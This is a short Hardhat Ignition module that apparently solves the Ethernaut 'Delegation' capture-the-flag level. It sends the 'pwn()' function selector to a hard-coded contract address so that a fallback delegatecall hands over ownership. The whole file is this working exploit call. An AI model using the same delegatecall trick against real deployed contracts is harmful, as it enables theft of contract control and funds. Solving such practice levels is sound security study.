import { buildModule } from "@nomicfoundation/hardhat-ignition/modules";
import { ethers } from "ethers";

export default buildModule("DelegationModule", (m) => {
  const delegationAddress = "0xC4668C9e834D4b3e64a7821f840cC7CBA99D7bAe";
  
  const pwnSelector = ethers.id("pwn()").slice(0, 10);
  
  m.send("pwnDelegation", delegationAddress, 0n, pwnSelector);

  return { };
});
